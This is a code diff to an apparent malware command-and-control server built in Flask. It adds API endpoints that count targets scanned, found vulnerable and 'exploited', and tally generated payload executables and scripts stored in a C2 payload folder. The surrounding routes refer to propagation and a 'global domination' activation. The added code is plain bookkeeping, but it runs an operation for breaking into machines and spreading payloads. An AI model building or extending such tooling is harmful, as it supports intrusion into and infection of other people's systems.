@@ -7425,6 +7425,65 @@ def propagation_stop():
         return jsonify({"status": "error", "error": str(e)}), 500
 
 
+@app.route("/api/exploitation/stats")
+def exploitation_stats():
+    """Get exploitation statistics."""
+    try:
+        db = get_db()
+        
+        # Count exploitation tasks
+        scanned = db.execute("""
+            SELECT COUNT(*) FROM tasks WHERE task_type = 'scan'
+        """).fetchone()[0]
+        
+        vulnerable = db.execute("""
+            SELECT COUNT(*) FROM tasks 
+            WHERE task_type IN ('scan', 'detect') AND status = 'completed'
+        """).fetchone()[0]
+        
+        exploited = db.execute("""
+            SELECT COUNT(*) FROM tasks 
+            WHERE task_type = 'exploit' AND status = 'completed'
+        """).fetchone()[0]
+        
+        return jsonify({
+            "status": "ok",
+            "targets_scanned": scanned,
+            "vulnerable_found": vulnerable,
+            "exploited": exploited
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "error": str(e)}), 500
+
+
+@app.route("/api/payloads/stats")
+def payloads_stats():
+    """Get payload generation statistics."""
+    try:
+        db = get_db()
+        
+        # Count payload generation tasks
+        generated = db.execute("""
+            SELECT COUNT(*) FROM tasks 
+            WHERE task_type = 'generate_payload' AND status = 'completed'
+        """).fetchone()[0]
+        
+        # Count available payloads in static/
+        import os
+        payload_dir = "/mnt/F/C2_server-main/static/payloads"
+        available = 0
+        if os.path.exists(payload_dir):
+            available = len([f for f in os.listdir(payload_dir) if f.endswith(('.exe', '.dll', '.py', '.ps1', '.sh'))])
+        
+        return jsonify({
+            "status": "ok",
+            "generated": generated,
+            "available": available
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "error": str(e)}), 500
+
+
 # ──────────────────────── API: GLOBAL DOMINATION ────────────────────────
 
 @app.route("/api/domination/activate", methods=["POST"])
